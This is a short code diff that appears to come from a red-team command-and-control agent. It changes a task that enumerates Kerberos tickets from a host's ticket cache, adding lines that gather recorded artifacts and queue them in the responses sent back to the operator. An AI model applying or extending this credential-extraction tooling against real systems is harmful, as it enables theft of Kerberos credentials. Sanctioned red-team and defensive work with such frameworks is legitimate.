@@ -7,6 +7,7 @@
 #if TICKET_CACHE_EXTRACT
 
 using System;
+using System.Collections.Generic;
 using System.Runtime.Serialization;
 using ApolloInterop.Classes;
 using ApolloInterop.Features.KerberosTickets;
@@ -47,6 +48,10 @@ public class ticket_cache_extract : Tasking
         {
             resp = CreateTaskResponse($"Failed to enumerate tickets: {e.Message}", true, "error");
         }
+        //get and send back any artifacts
+        IEnumerable<Artifact> artifacts = _agent.GetTicketManager().GetArtifacts();
+        var artifactResp = CreateArtifactTaskResponse(artifacts);
+        _agent.GetTaskManager().AddTaskResponseToQueue(artifactResp);
         _agent.GetTaskManager().AddTaskResponseToQueue(resp);
     }
 }
